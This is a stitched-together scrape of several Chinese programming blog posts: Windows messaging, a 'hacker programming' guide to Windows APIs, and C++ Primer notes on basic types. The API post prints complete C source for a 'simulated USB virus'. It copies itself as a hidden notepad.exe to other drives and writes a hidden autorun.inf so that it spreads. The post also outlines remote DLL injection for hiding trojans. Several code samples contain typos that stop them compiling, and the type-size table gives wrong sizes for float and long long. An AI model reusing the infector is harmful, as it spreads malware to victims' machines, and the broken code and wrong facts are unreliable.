Windows消息机制的处理SengMessage将指定的消息发送给指定的窗口，窗口接受到消息也又相应的新给产生 DOS程序与Windows程序执行流对比Windows下的窗口应用程序都是基于消息机制的，操作系统与应用程序之间、应用程序与应用程序之间，大部分都是通过消息机制进行通信、交互的。 DOS程序执行流 DOS程序的流程是按照代码的顺序和流程依此执行。 Windows程序执行流程Windows开发的过程，需要关注的部分是“主程序”和“窗口过程”两部分。 简单Windows应用程序WinMain在DOS的年代，Windows下的命令行程序，要使用C语言编写代码的时候都是从main函数开始的。而在Win32下编程的时候，程序则是从WinMain中开始； 123456int WINAPI WinMain( HINSTANCE hInstance, //应用程序实例句柄 HINSTANCE hPrevInstance, //上一个实例的实例句柄 LPWSTR lpCmdLine, //主函数参数，用于在程序启动时给进程传递参数 int nShowCmd //进程显示方式); WinMain函数中的流程12345678910111213141516171819202122232425262728293031int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd ){ MSG msg; BOOL bGet; MyRegisterClass(hInstance); if(!InitInstance(hInstance,SW_SHOWNORMAL)) { return FALSE; } while((bRet = GetMessage(&amp;Msg,NULL,0,0))!= 0) { if(bRet == -1) { break; } else { TranslateMessage(&amp;Msg); DispatchMessage(&amp;Msg); } } return Msg.wParam;} 所用到的API函数包括：GetMessage()、TranslateMessage()、DispatchMessage()。 123456BOOL GetMessage( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax ); 该函数用来获取属于自己的消息，并填充MSG结构体。有一个类似于GetMessage()的函数是PeekMessage(); 1234567BOOL PeekMessage( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg ); 该函数主要用于判断队列中是否有消息，如果没有消息，可以主动让出CPU时间给其他进程。 123BOOL TranslateMessage( const MSG* lpMsg ); 该函数是用来处理键盘消息的，它将虚拟码消息转换为字符消息，也就是将WM_KEYDOWN消息和WM_KEYUP消息转换为WM_CHAR消息，将WM_SYSKEYDOWN消息和WM_SYSKEYUP消息转换为WM_SYSCHAR消息。 123LONG DispatchMessage( const MSG* lpmsg ); 模拟鼠标键盘按键的操作基于发送消息的模拟无论是鼠标指针的移动、点击，还是键盘的按键，通常在Windows应用程序中都会转换为相对应的消息。 关于鼠标的动作如下： 鼠标操作详解 同样的，系统也定义了键盘的按下与抬起的消息。键盘按下的消息是WM_KEYDOWN，与之对应的是键盘抬起的消息WM_KEYUP。 PostMessage函数堆键盘按键的模拟SengMessage和PostMessage这两个函数可以对指定的窗口发送消息，既然鼠标和键盘的操作可以被系统转换为相应的消息，那么就可以使用PostMessage来模拟操作； 通过消息实现进程间的通信","link":"/2019/11/04/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B-%E5%85%A5%E9%97%A8/"},{"title":"黑客编程-常用API","text":"Windows API是Windows下开发应用程序的基础知识，我们常见的API函数包括进程、线程、文件、注册表、服务等相关的API函数。 文件API在Windows下，文件格式有很多种，如常见的图片、视频、音频等文件都属于保存在硬盘的存储格式不相同的文件。除了常见的磁盘文件格式外，管道、邮槽，甚至是设备对象，在Windows下也被当成文件来对待的。 文件操作相关API文件打开与关闭要对文件进行操作，首先要把文件打开，文件打开后会返回一个可用于操作文件的句柄，通过这个句柄就可以对文件进行读写操作了。 CreateFile123456789HANDLE CreateFileA( LPCSTR lpFileName, //打开的文件名 DWORD dwDesiredAccess, //访问模式 DWORD dwShareMode, //共享模式 LPSECURITY_ATTRIBUTES lpSecurityAttributes, //安全属性 DWORD dwCreationDisposition, //创建或打开的文件存在或不存在的解决方法 DWORD dwFlagsAndAttributes, //指定创建新建文件的属性和对文件的操作方式 HANDLE hTemplateFile //文件句柄模板); CloseHandle123BOOL CloseHandle( HANDLE hObject //被创建的句柄); 文件操作文件操作一般分为四种：增、删、改、查。 DeleteFile删除文件 123BOOL DeleteFile( LPCTSTR lpFileName //标识删除的文件名); ReadFile读文件 1234567BOOL ReadFile( HANDLE hFile, //文件句柄 LPVOID lpBuffer, //缓冲区，函数会从文件中读取的数据保存进入这个缓冲区 DWORD nNumberOfBytesToRead, //要求读入的字节数 LPDWORD lpNumberOfBytesRead, //返回实际读入的字节数 LPOVERLAPPED lpOverlapped //一般为NULL); WriteFile写文件 1234567BOOL WriteFile( HANDLE hFile, //文件句柄 LPCVOID lpBuffer, //WriteFile函数会将该缓冲区的内容进行写入 DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped); FlushFileBuffers为了保证数据及时写入文件中,使用该函数,将缓冲区中的文件立即提交 123BOOL FlushFileBuffers( HANDLE hFile //文件句柄); SetFilePointer123456DWORD SetFilePointer( HANDLE hFile, //文件句柄 LONG lDistanceToMove, //指定要移动文件指针的距离 PLONG lpDistanceToMoveHigh, //一个指向LONG型的指针,移动距离的高32位 DWORD dwMoveMethod //指定移动的起始位置); 驱动器及目录操作目录操作的四个主要函数,分别是获取本地所有逻辑驱动器、获取驱动器类型、创建目录和移除目录。 CreateDirectory1234BOOL CreateDirectory( LPCTSTR lpPathName, //目录名称 LPSECURITY_ATTRIBUTES lpSecurityAttributes //安全属性); GetDriveType123UINT GetDriveTypeA( LPCSTR lpRootPathName //要获取的逻辑驱动器类型的驱动器名); GetLogicalDriveStrings1234DWORD GetLogicalDriveStringsW( DWORD nBufferLength, //标识缓冲区长度 LPWSTR lpBuffer //表示接受本地逻辑驱动器名的缓冲区); RemoveDirectory123BOOL RemoveDirectoryA( LPCSTR lpPathName //要移除的目录名); 模拟优盘病毒U盘病毒的原理U盘病毒的原理主要依赖于AutoRun.inf文件，它的作用是再载入光盘时自动运行某个指定的文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;Windows.h&gt;char szAutoRun[] = &quot;[AutoRun] \\\\r\\nopen=notepad.exe \\\\r\\nshell\\\\open=打开(&amp;O) \\\\r\\nshell\\\\open\\\\Command=notepad.exe \\\\r\\nshell\\\\explore=资源管理器(&amp;X) \\\\r\\nshell\\\\explore\\\\Command=notepad.exe \\\\r\\nshellexecute=notepad.exe \\\\r\\nshell\\\\Auto\\\\Command=notepad.exe&quot;;void infect(char *pszFile, UINT uDriveType){ char szDriveString[MAXBYTE] = { 0 }; DWORD dwRet = 0; DWORD iNum = 0; char szRoot[4] = { 0 }; UINT uType = 0; char szTarget[MAX_PATH] = { 0 }; dwRet = GetLogicalDriveStrings(MAXBYTE, szDriveString); while ( iNum &lt; dwRet ) { strncpy(szRoot, &amp;szDriveString[iNum], 3); uType = GetDriveType(szRoot); if ( uType == uDriveType ) { // 拷贝文件 lstrcpy(szTarget, szRoot); lstrcat(szTarget, &quot;notepad.exe&quot;); CopyFile(pszFile, szTarget, FALSE); // 设置notepad.exe文件为隐藏属性 SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN); // 建立AutoRun.inf文件 lstrcpy(szTarget, szRoot); lstrcat(szTarget, &quot;autorun.inf&quot;); HANDLE hFile = CreateFile(szTarget, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); DWORD dwWritten = 0; WriteFile(hFile, szAutoRun, lstrlen(szAutoRun), &amp;dwWritten, NULL); CloseHandle(hFile); // 设置AutoRun.inf文件为隐藏属性 SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN); } iNum += 4; }}int main(){ // 自身所在地位置 char szFileName[MAX_PATH] = { 0 }; // 保存当前文件所在地盘符 char szRoot[4] = { 0 }; // 保存磁盘类型 UINT uType = 0; // 获取当前所在完整路径及文件名 GetModuleFileName(NULL, szFileName, MAX_PATH); // 获取所在盘符 strncpy(szRoot, szFileName, 3); uType = GetDriveType(szRoot); switch ( uType ) { case DRIVE_FIXED: { // 如果是在硬盘上就检测一遍是否有移动磁盘 infect(szFileName, DRIVE_REMOVABLE); break; } case DRIVE_REMOVABLE: { // 如果在移动磁盘上则将自己复制到移动磁盘上 infect(szFileName, DRIVE_FIXED); break; } } return 0;} 进程在Windows系统中，每时每刻都有不同的线程的在运行着。当Windows的桌面启动的时候，”Explorer.exe”就会出现在进程列表中。 当运行一个程序的时候，操作系统就会将这个程序装入内存，分配各种运行所需的资源，创建主线程等一系列工作。进程是运行当中的程序，进程是向操作系统申请资源的基本单位。 创建进程WinExec1234UINT WinExec( LPCSTR lpCmdLine, //指向一个要执行的可执行文件 UINT uCmdShow //程序运行后的窗口状态); CreateProcess123456789101112BOOL CreateProcessA( LPCSTR lpApplicationName, //要执行的模块名称 LPSTR lpCommandLine, //要执行的命令行 LPSECURITY_ATTRIBUTES lpProcessAttributes, //指向SECURITY_ATTRIBUTES结构的指针，该 结构确定子进程是否可以继承返回到新进程对象的句柄 LPSECURITY_ATTRIBUTES lpThreadAttributes, //指向SECURITY_ATTRIBUTES结构的指针，该 结构确定子进程是否可以继承返回到新线程对象的句柄 BOOL bInheritHandles, //如果此参数为TRUE，则新进程将继承调用进程中的每个可继承句柄 DWORD dwCreationFlags, //控制优先级类别和流程创建的标志 LPVOID lpEnvironment, //指向新进程的环境块的指针 LPCSTR lpCurrentDirectory, //进程当前目录的完整路径 LPSTARTUPINFOA lpStartupInfo, //指向STARTUPINFO或STARTUPINFOEX结构的指针 LPPROCESS_INFORMATION lpProcessInformation //指向PROCESS_INFORMATION结构的指针，该 结构接收有关新进程的标识信息); URLDownloadToFile1234567HRESULT URLDownloadToFile( LPUNKNOWN pCaller, //控件的接口,如果不是控件则为0 LPCTSTR szURL, //URL地址 LPCTSTR szFileName, //下载后保存的名字 DWORD dwReserved, //保留字段 LPBINDSTATUSCALLBACK lpfnCB //下载进度状态回调); Demo12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#define EXEC_FILE &quot;C:\\\\windows\\\\system32\\\\notepad.exe&quot;int main(){ PROCESS_INFORMATION pi = {0}; STATRUPINFO si = {0}; si.cb = sizeof(si); BOOL bRet = CreateProcess(EXEC_FILE,NULL,NULL,NULL,FALSE,NULL,NULL,NULL,&amp;si,&amp;pi); if(bRet == FALSE) { printf(&quot;CreateProcess Error %d&quot;,GetLastError()); return -1; } closeHandle(pi.hThread); closeHandle(pi.hProcess); return 0;} 结束进程FindWindow1234HWND FindWindowA( LPCSTR lpClassName, //检索处理顶级窗口的类名和窗口名称匹配指定的字符串 LPCSTR lpWindowName //指向一个以NULL字符结尾的、用来指定窗口名（即窗口标题）的字符串); OpenProcess打开一个进程 12345HANDLE OpenProcess( DWORD dwDesiredAccess, //打开进程欲获得的访问权限 BOOL bInheritHandle, //指定获取的句柄是否可以继承 DWORD dwProcessId //指定进程的PID号); GetWindowThreadProcessId获取进程的ID号 1234DWORD GetWindowThreadProcessId( HWND hWnd, //窗口句柄 LPDWORD lpdwProcessId //用户返回窗口句柄所对应的PID); TerminateProcess1234BOOL TerminateProcess( HANDLE hProcess, //欲终止进程的进程P句柄 UINT uExitCode //退出码); 枚举进程进程及DLL枚举CreateToolhelp32Snapshot1234HANDLE CreateToolhelp32Snapshot( DWORD dwFlags, //创建系统快照类型 DWORD th32ProcessID //如果枚举的是系统的进程或线程，该参数为NULL，如果是进程中加载的DLL的话，该参数为进程ID); Process32First1234BOOL Process32First( HANDLE hSnapshot, //由上面的函数返回的句柄 LPPROCESSENTRY32 lppe //指向ProcessEntry结构体的指针); Process32Next1234BOOL Process32Next( HANDLE hSnapshot, LPPROCESSENTRY32 lppe); tagMODULEENTRY32123456789101112typedef struct tagMODULEENTRY32 { DWORD dwSize; DWORD th32ModuleID; DWORD th32ProcessID; DWORD GlblcntUsage; DWORD ProccntUsage; BYTE *modBaseAddr; DWORD modBaseSize; HMODULE hModule; TCHAR szModule[MAX_PATH]; TCHAR szExePath[MAX_PATH];} MODULEENTRY32, *PMODULEENTRY32, *LPMODULEENTRY32; DLL编程DLL(动态链接库)是一个可以被其他应用程序调用的程序模块，其中封装了可以被调用的资源或函数。 编写一个简单的DLL导出函数是DLL提供给外部程序或其他类型可执行文件调用的函数。 DLL程序的入口函数不是main函数，而实DllMain函数 12345BOOL WINAPI DllMain( _In_ HINSTANCE hinstDLL, //当前DLL模块的句柄 _In_ DWORD fdwReason, //调用原因 _In_ LPVOID lpvReserved //保留参数); Code123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;tchar.h&gt;extern &quot;C&quot; __declspec(dllexport) VOID MsgBox(char *szMsg); //导出函数BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: { MsgBox(&quot;!DLL_PROCESS_ATTACH!&quot;); break; } case DLL_PROCESS_DETACH: { break; } case DLL_THREAD_ATTACH: { break; } case DLL_THREAD_DETACH: { break; } } return TRUE;}VOID MsgBox(char *szMsg){ char szModuleName[MAX_PATH] = { 0 }; GetModuleFileName(NULL, LPWSTR(szModuleName), MAX_PATH); MessageBox(NULL, LPCWSTR(szMsg), LPCWSTR(szModuleName), MB_OK);} 对Dll的调用DLL程序无法单独运行，需要通过一个应用程序来调用这个dll中的导出函数； GetProcAddress1234FARPROC GetProcAddress( HMODULE hModule, //包含函数或变量的DLL模块的句柄 LPCSTR lpProcName // 函数名); LoadLibrary123HMODULE LoadLibraryW( LPCWSTR lpLibFileName //模块名); 远程线程Windows操作系统下，为了避免各个进程相互影响，每个进程地址空间都是被隔离的。 DLL远程注入木马或病毒编写的好坏决定其隐藏的成都，无论是木马还是病毒，如果他们被编写称为exe程序，那么在运行的时候必定会产生一个进程。 CreateRemoteThread123456789HANDLE CreateRemoteThread( HANDLE hProcess, //要在其中创建线程的进程的句柄 LPSECURITY_ATTRIBUTES lpThreadAttributes, //指向SECURITY_ATTRIBUTES结构的指针 SIZE_T dwStackSize, //堆栈的初始大小 LPTHREAD_START_ROUTINE lpStartAddress, //指向由线程执行的，类型为LPTHREAD_START_ROUTINE的应用程序定义的函数的指针，该指针表示远程进程中线程的起始地址 LPVOID lpParameter, //指向要传递给线程函数的变量的指针 DWORD dwCreationFlags, //控制线程创建的标志 LPDWORD lpThreadId //指向接收线程标识符的变量的指针); 卸载远程注入FreeLibrary123BOOL FreeLibrary( HMODULE hLibModule //要卸载模块的句柄);","link":"/2019/12/12/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B-%E5%B8%B8%E7%94%A8API/"},{"title":"黑客编程-网络","text":"常用的端口扫描、SQL注入扫描、数据包嗅探、网络口令猜解、后门、木马等知识的基础技术。但是这些技术都基于一个前提，都必须在网络环境下实现。","link":"/2019/11/05/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B-%E7%BD%91%E7%BB%9C/"},{"title":"C++ Primer - 基础","text":"《C++ Primer》第五版引入了11标准相关内容，本文是阅读第一章”C++基础”时所做的笔记； C++基础变量和基本类型C++语言中定义了内置类型，同时也为程序员提供了自定义数据类型机制。基于此，C++标准库定义了一些更加复杂的数据类型； 基本内置类型C++定义了一套包括算数类型和空类型在内的基本数据类型。基于算数类型包含了字符、整型、布尔值和浮点数。空类型不对应具体的值，仅用于一些特殊的场合，最常见的包括：当函数不反悔任何值的时候使用空类型作为返回类型。 算数类型算术类型分为两种：整型和浮点型； 类型 含义 大小 bool 布尔类型 1字节 char 字符 1Byte wchar_t 宽字符 2Byte char16_t Unicode字符 char32_t Unicode字符 short 短整型 2Byte int 整型 4Byte long 长整型 8Byte long long 长整型 16Byte float 单精度浮点数 8Byte double 双精度浮点数 long double 扩展精度浮点数 除去布尔型和扩展的字符型之外，其他类型可以划分为带符号的(signed)和无符号(unsigned)两种。带符号的类型可以表示正数、负数或0，无符号数仅可以表示大于0的值。 类型转换对象的类型定义了对象能包含的数据和能参与的运算，其中一种运算被大多数支持，就是将对象从一种给定的类型转换为另一种相关的类型。 123456bool b = 42; //b为真int i = b; //i的值为1i = 3.14; //i的值为3double pi = i; //pi的值为3.0unsigned char c = -1; //假设char占用8bit,c的值为255signed char c2 = 256; //假设char占用8bit，c2的值是未定义的 //因为有符号数的取值为 无符号类型的表达式1234unsigned u = 10;int i = -42; //不加任何符号就是有符号类型std::cout &lt;&lt; i + i &lt;&lt; std::endl; //输出-84std::cout &lt;&lt; u + i &lt;&lt; std::endl; //如果int占32位，输出4294977264 在第一个表达式中，两个有符号数相加并得到了相应的结果。 在第二个表达式中，相加前首先把整数-42转换成无符号数。把负数转换成符号书类似于直接给无符号数赋一个负值，结果等于这个负数加上无符号数的模。 123unsigned u1 = 42,u2 = 10;std::cout &lt;&lt; u1 - u2 &lt;&lt; std::endl; //正确输出32std::cout &lt;&lt; u2 - u1 &lt;&lt; std::endl; //正确，不过是取模后的值 尝试用无符号数来做循环： 12345678910#include &lt;iostream&gt;using namespace std;int main(){ for (unsigned i = 10; i &gt;= 0; --i) { std::cout &lt;&lt; i &lt;&lt; std::endl; } return 0;} 这个循环会成为一个死循环； 可以使用while来代替for循环： 123456789101112#include &lt;iostream&gt;using namespace std;int main(void){ unsigned int i = 10; while (i&gt;0) { i--; std::cout &lt;&lt; i &lt;&lt; std::endl; } return 0;} 字面值常量整型和浮点型字面值 12320 //十进制024 //八进制0x14 //十六进制 字符和字符串字面值 由单引号括起来的一个字符称为char类型，双引号括起来的多个字符则为字符串； 指定字面值的类型 前缀 含义 类型 u Unicode16字符 char16_t U Unicode32字符 char32_t L 宽字符 wchar_t u8 UTF-8 char u or U unsigned unsigned l or L long long ll or LL longlong longlong 变量变量定义123456int sum = 0,value,units_sold = 0; //sum和units_sold初始化为0，value没有初始化Sales_item item; //item的类型是Sales_item;double price = 109.99;double discount = price * 0.16; 列表初始化1234int units_sold = 0;int units_sold = {0};int units_sold{0};int units_sold{0}; C++11新标准用花括号来初始化变量得到了全面应用，这种初始化的形式被称为列表初始化 列表初始化有一个特点：如果使用列表初始化且初始值存在丢失信息的风险，则编译器报错 默认初始化如果是内置类型的变量未被显式的初始化，则变量默认初始化，此时变量被赋予了默认值。 定义于任何函数体之外的变量被初始化为0，定义在函数体内部的内置变量不被初始化。 12std::string empty; //empty非显式的初始化为一个空串Sales_item; //被默认初始化为Sales_item对象 变量声明和定义的关系为了允许把程序拆分为多个逻辑部分来编写，c++支持分离式编译机制，该机制允许把程序分割为若干个文件，每个文件可以单独编译； 如果想声明一个变量而非定义它，就在变量名前加关键字extern，而且不要显式地初始化变量； 12extern int i ; //声明i而非定义iint j ; //声明而非定义j 任何包含了显式初始化的声明即成为定义。我们能给由extern关键字标记的变量赋一个初始值，但是这样也就抵消了extern的作用。 1extern double pi = 3.1416; //定义 标识符C++标识符由字母数字下划线组成，其中必须以字母或下划线开头； 1int somename,someName,SomeName,SOMENAME; 名字的作用域作用域是程序的一部分，在其中名字尤其特定的函数。C++中大多数作用域以花括号分割； 名字main定义于所有花括号之外，它和其他大部分定义在函数体之外的名字一样拥有全局作用域； 123456789101112int reused = 42;int main(){ int unique = 0; //局部变量 std::cout &lt;&lt; reused &lt;&lt; std::endl; //42 int reused = 10; std::cout &lt;&lt; reused &lt;&lt; std::endl; //10 std::cout &lt;&lt; ::reused &lt;&lt; std::endl; //42 ::是全局作用域 return 0;} 复合类型引用C++11中增加了一种引用：右值引用 引用为对象起别名，引用类型引用另外一种类型； 123int value = 1024;int &amp;refVal = value;int &amp;value ; //报错，引用必须赋值或被初始化 引用：引用是一个对象的别名，引用类型引用（refer to）另外一种类型。如int &amp;refVal = val;。 引用必须初始化。 引用和它的初始值是绑定bind在一起的，而不是拷贝。 指针指针是指向的另外一种类型的复合类型，与引用类型，指针也实现了对其他对象的间接访问； 指针本身就是一个对象，允许指针的赋值和拷贝 指针无须再定义时赋初值 定义指针12int *p1,*p1;double dp,*dp1; //dp1是指向double类型的指针 获取对象地址指针存放某个对象的地址，如果要获取该地址，需要使用取地址操作符(&amp;)； 12int value = 0;int *p = &amp;value; //p存放的是value的地址，或者说p是指向变量value的指针 错误写法: 123456double value;double *p = &amp;value; //正确，初始值就是一个double类型的变量，对变量取地址double *p1 = p; //正确，初始值就是指向double类型的指针int *p2 = p1; //错误，指针p2和p1的类型不匹配p2 = &amp;value; //错误，试图把double类型的指针赋值给int类型的指针，vs编译器报错间接寻址不同 如果一定需要两个类型不同的指针做赋值运算，可以对指针类型进行强制转换： 12345678910111213int main(void){ double value; double *p = &amp;value; //正确，初始值就是一个double类型的变量，对变量取地址 double *p1 = p; //正确，初始值就是指向double类型的指针 int *p2 = (int *)p1; p2 = (int *)&amp;value; std::cout &lt;&lt; &amp;value &lt;&lt; std::endl; std::cout &lt;&lt; p &lt;&lt; std::endl; std::cout &lt;&lt; p1 &lt;&lt; std::endl; std::cout &lt;&lt; p2 &lt;&lt; std::endl;} 结果： 指针值指针的值(地址)应该输入下列四种状态之一： 指向一个对象 指向紧邻对象所占空间的下一个威指 空指针，没有指向 无效指针，也就是上述情况之外的值 指针访问对象如果指针指向一个对象，则允许使用解引用符(操作符*)来访问该对象 123int value = 42;int *p = &amp;value;cout &lt;&lt; *p &lt;&lt; endl; 对指针解引用会得到所指的对象，因此我们给解引用的结果赋值，实际就是给指针所指向的对象赋值 12345678910int main(){ int value = 42; int *p = &amp;value; std::cout &lt;&lt; *p &lt;&lt; std::endl; *p = 0; //指针解引用 std::cout &lt;&lt; *p &lt;&lt; std::endl; return 0;} 空指针空指针不指向任何对象，再试图使用一个指针之前代码可以检查是否为空。 123456int main(){ int *p1 = nullptr; //等价于int *p1 = 0 int *p2 = 0; int *p3 = NULL;} nullptr是一种特殊类型的字面值，它可以转换成任意其他的指针类型 赋值和指针指针和引用都能提供对其他对象的间接访问； 12345678910111213141516171819int main(){ int i = 42; int *p1 = 0; //p1没有指向 int *p2 = &amp;i; //p2指向int类型的i int *p3; //p3没有指向 std::cout &lt;&lt; i &lt;&lt; std::endl; std::cout &lt;&lt; p1 &lt;&lt; std::endl; std::cout &lt;&lt; p2 &lt;&lt; std::endl; std::cout &lt;&lt; p3 &lt;&lt; std::endl; p3 = p2; //p3现在和p2指向是一样的 p2 = 0; //p2没有指向了 std::cout &lt;&lt; i &lt;&lt; std::endl; std::cout &lt;&lt; p1 &lt;&lt; std::endl; std::cout &lt;&lt; p2 &lt;&lt; std::endl; std::cout &lt;&lt; p3 &lt;&lt; std::endl; return 0;} 其他指针操作只要指针拥有一个合法值，就可以将它使用再表达式中； 1234567891011121314151617int main(){ int value = 1024; int *p = 0; int *p1 = &amp;value; if (p != NULL) { std::cout &lt;&lt; *p &lt;&lt; std::endl; } if (p1 != nullptr) { std::cout &lt;&lt; *p1 &lt;&lt; std::endl; } return 0;} void* 指针void是一种特使的指针类型，可以存放任意对象的地址。一个void指针存放一个地址，这一点和其他指针类似； 1234567891011121314151617int main(){ double d = 3.14; double *p1 = &amp;d; void *p2 = &amp;d; p2 = p1; std::cout &lt;&lt; d &lt;&lt; std::endl; //3.14 std::cout &lt;&lt; &amp;d &lt;&lt; std::endl; //0x60fe88 std::cout &lt;&lt; *p1 &lt;&lt; std::endl; //3.14 std::cout &lt;&lt; &amp;p1 &lt;&lt; std::endl; //0x60fe84 std::cout &lt;&lt; p2 &lt;&lt; std::endl; //0x60fe88 std::cout &lt;&lt; &amp;p2 &lt;&lt; std::endl; //0x60fe80 printf(&quot;%x\\n&quot;,p2); //0x60fe88 return 0;} *void以内存的视角来看，它只可以存储内存，没有办法访问内存中的对象** 复合类型定义多个变量12int *p; //合法但是容易产生误导int* p1,p2; //p1是指向int的指针，p2是int 指向指针的指针通过的个数可以区分指针的级别。也就是说，**表示指向指针的指针，表示指向指针的指针的指针，以此类推；** 123456789int main(){ int value = 1024; int* p = &amp;value; int** p1 = &amp;p; std::cout &lt;&lt; value &lt;&lt; std::endl; std::cout &lt;&lt; *p &lt;&lt; std::endl; std::cout &lt;&lt; **p1 &lt;&lt; std::endl;} 结果： 指向指针的引用引用本身不是一个对象，因此不能定义指向引用的指针，但指针是对象，所以存在对指针的引用 123456int i = 42;int* p;int*&amp; r = p;r = &amp;i;*r = 0; const限定符可以使用const限定符来对变量的类型加以限定； 1const int i = 512; //缓冲区大小 使用const以后i就变成了一个常量值 const的引用可以把引用绑定在const对象上，就像绑定在其他对象上一样，我们称之为对常量的引用。 1234cosnt int ci = 1024;const int&amp; r1 = ci; //正确，引用及其对应的对象都是常量r1 = 42; //常量引用不可以修改int &amp;r2 = ci; //非常量引用指向一个常量对象 初始化和对const的引用引用的类型必须与其所用对象的类型一致 12345int i = 42;const int&amp; r1 = i; //运行将const int&amp;绑定到一个普通int上const int&amp; r2 = 42; //r2是一个常量引用const int&amp; r3 = r1 * 2; //r3是一个常量引用int&amp; r4 = r1 * 2; //错误，r4是一个普通的非常量引用 指针和const与引用一样，也可以令指针指向常量或非常量。指向常量的指针不能用于修改其所致对象的值； 1234cosnt double pi = 3.14; //pi是一个常量，不能修改值double* ptr = &amp;pi; //错误，ptr是一个普通指针，不能修改const的值const double* cptr = &amp;pi; //正确*cptr = 42; //错误，常量不修改修改 const指针指针是对象而引用不是，因此就像其他对象类型一样，允许把指针本身定义为常量。常量指针必须初始化，而且初始化一旦完成，它的值就不允许改变了； *放在const关键字之前用以说明指针是一个常量，这样的书写还有一层意思，即不变的是指针本身的值而非指向的那个值 1234int errNumb = 0;int *const curErr = &amp;errNumb; //curErr将一直指向errNumbconst double pi = 3.14159;const double *const pip = &amp;pi; //pip是一个指向常量对象的常量指针 顶层const顶层const表示指针本身是个常量，而底层const表示指针所指的对象是一个常量 123456int i = 0;int* const p1 = &amp;i; //不能改变p1的值，这是一个顶层constcosnt int ci = 42; //不能改变ci的值，这是一个顶层constcosnt int* p2 = &amp;ci; //允许改变p2的值，这是一个底层constconst int* const p3 = p2; //靠右的是顶层const，靠左的是底层constconst int&amp; r = ci; constexpr和常量表达式常量表达式是指值不会改变并且在编译过程就能得到计算结果的表达式。 处理类型类型别名有两种方式可以定义类型别名，传统的方法使用typedef； 12typedef double wages; //wange是double的别名typedef wanges base, *p; //base是double的别名，p是double*的别名 C++11的标准中定义了一种新的办法，使用别名声明来定义类型的别名； 1using SI = Sales_item; //SI是Sales_item的别名 指针、常量和类型别名123typedef char* pstring;const pstring cstr = 0; //cstr是指向char类型的常量const pstring *ps; //ps是一个指针，它的对象是指向char的常量指针 auto类型说明C++11标准中引入了auto类型说明符，它可以让编译器去我们去分析表达式所属的类型。和原来哪些只对应一种特定类型的说明不同，auto让编译器通过初始值来推算变量的类型。auto定义的变量必须有初始值 12345678int main(){ int val1 = 10; float val2 = 3.14; auto val3 = val1 + val2; std::cout &lt;&lt; val3 &lt;&lt; std::endl; //输出13.14 return 0;} 复合类型、常量和auto编译器推断出来的auto类型有时候和初始值的类型并不完全一样，编译器会适当的修改规则； decltype类型指示符如果希望从表达式的类型推断出要定义的变量的类型，但是不想用该表达式的值初始化变量。 自定义数据结构定义Sales_data类型12345struct Sales_data{ std::string bookNo; unsigned usits_sold = 0; double revenue = 0.0;} 类数据成员类体定义类的成员，我们的类只有数据成员。类的数据成员定义了类的对象的具体内容，每个对象有自己的一份数据成员拷贝。 练习练习2.1类型 int、long、long long 和 short 的区别是什么？无符号类型和带符号类型的区别是什么？float 和 double的区别是什么？ 答：C++ 规定 short 和 int 至少16位，long 至少32位，long long 至少64位。 带符号类型能够表示正数、负数和 0 ，而无符号类型只能够表示 0 和正整数。 练习2.2计算按揭贷款时，对于利率、本金和付款分别应选择何种数据类型？说明你的理由。 答：使用double。 联系2.3123456789101112131415#include &lt;iostream&gt;using namespace std;int main(){ unsigned u = 10,u2 = 42; std::cout &lt;&lt; u2 -u &lt;&lt; std::endl; //32 std::cout &lt;&lt; u-u2 &lt;&lt; std::endl; //4294967264 int i = 10,i2 = 42; std::cout &lt;&lt; i2 - i &lt;&lt; std::endl; //32 std::cout &lt;&lt; i - i2 &lt;&lt; std::endl; ///-32 std::cout &lt;&lt; i - u &lt;&lt; std::endl; //0 std::cout &lt;&lt; u - i &lt;&lt; std::endl; //0 return 0;} 练习2.5指出下述字面值的数据类型并说明每一组内几种字面值的区别： (a) ‘a’, L’a’, “a”, L”a”(b) 10, 10u, 10L, 10uL, 012, 0xC(c) 3.14, 3.14f, 3.14L(d) 10, 10u, 10., 10e-2 (a): 字符字面值，宽字符字面值，字符串字面值，宽字符串字面值。 (b): 十进制整型，十进制无符号整型，十进制长整型，八进制整型，十六进制整型。 (c): double, float, long double (d): 十进制整型，十进制无符号整型，double, double 练习2.6下面两组定义是否有区别，如果有，请叙述之： 12int month = 9, day = 7; //十进制int month = 09, day = 07; //八进制，并且八进制不能写9 练习2.7下述字面值表示何种含义？它们各自的数据类型是什么？ (a) “Who goes with F\\145rgus?\\012”(b) 3.14e1L(c) 1024f(d) 3.14L (a) Who goes with Fergus?(换行)，string 类型 (b) long double (c) 无效，因为后缀f只能用于浮点字面量，而1024是整型。 (d) long double 练习2.8请利用转义序列编写一段程序，要求先输出 2M，然后转到新一行。修改程序使其先输出 2，然后输出制表符，再输出 M，最后转到新一行。 1234567#include &lt;iostream&gt;int main(){ std::cout &lt;&lt; 2 &lt;&lt; &quot;\\115\\012&quot;; std::cout &lt;&lt; 2 &lt;&lt; &quot;\\t\\115\\012&quot;; return 0;} 练习2.9解释下列定义的含义，对于非法的定义，请说明错在何处并将其改正。 (a) std::cin &gt;&gt; int input_value; (b) int i = { 3.14 }; (c) double salary = wage = 9999.99; (d) int i = 3.14; a): 12int input_value;std::cin &gt;&gt; input_value; b): 1int i = {3.14}; //用列表初始化内置类型的变量时，如果存在丢失信息的风险，则编译器将报错。 c): 12double wage;double salary = wage = 99.99; d): 12flaot i = 3.14;int i = 3.14 //浮点数赋值给整型 